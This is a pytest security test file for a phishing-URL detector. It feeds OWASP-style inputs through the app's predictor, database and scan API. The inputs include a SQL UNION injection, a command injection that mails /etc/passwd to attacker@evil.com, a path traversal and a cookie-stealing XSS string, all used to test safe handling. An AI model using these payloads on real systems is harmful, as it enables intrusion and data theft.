import os
import sys
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app import app
from core.predictor import PhishingPredictor
from core.preprocessor import normalize_url
from database import save_scan_result, get_scan_history


@pytest.fixture
def owasp_client():
    app.config["TESTING"] = True
    with app.test_client() as client:
        yield client


def test_owasp_a03_injection_sql(tmp_path):
    """OWASP A03: Injection - SQL injection in URL string"""
    db_file = str(tmp_path / "owasp_sql.db")
    payload = "http://target.com/page?id=1' UNION SELECT username, password FROM users--"
    
    # Save payload to database
    scan_result = {
        "url": payload,
        "prediction": "Phishing",
        "risk_score": 80,
        "risk_level": "HIGH RISK",
        "phishing_probability": 0.80,
        "explanations": ["Contains SQL keyword pattern"]
    }
    
    scan_id = save_scan_result(scan_result, db_file)
    assert scan_id == 1
    
    history = get_scan_history(limit=5, db_path=db_file)
    assert len(history) == 1
    assert history[0]["url"] == payload


def test_owasp_a03_injection_command():
    """OWASP A03: Injection - OS Command Injection in URL string"""
    cmd_payload = "http://example.com/index.html; cat /etc/passwd | mail attacker@evil.com"
    norm = normalize_url(cmd_payload)
    assert norm == cmd_payload
    
    predictor = PhishingPredictor()
    result = predictor.predict_url(cmd_payload)
    assert result["status"] == "success"
    assert "url" in result


def test_owasp_a03_injection_path_traversal():
    """OWASP A03: Path Traversal payload handling"""
    traversal_payload = "http://example.com/../../../../../../etc/passwd"
    predictor = PhishingPredictor()
    result = predictor.predict_url(traversal_payload)
    assert result["status"] == "success"
    assert result["risk_score"] > 0


def test_owasp_a03_xss_prevention(owasp_client):
    """OWASP A03: Cross-Site Scripting (XSS) payload via API"""
    xss_payload = "http://example.com/<script>alert(document.cookie)</script>"
    res = owasp_client.post("/api/scan", json={"url": xss_payload})
    assert res.status_code == 200
    data = res.get_json()
    assert data["status"] == "success"
    assert data["url"] == xss_payload


def test_owasp_dos_oversized_input_handling():
    """OWASP A05: Security Misconfiguration / DoS - Oversized URL input handling"""
    huge_url = "http://example.com/" + "A" * 10000
    predictor = PhishingPredictor()
    result = predictor.predict_url(huge_url)
    assert result["status"] == "success"
    assert result["risk_score"] >= 20
    assert any("Excessively long URL" in exp for exp in result["explanations"])
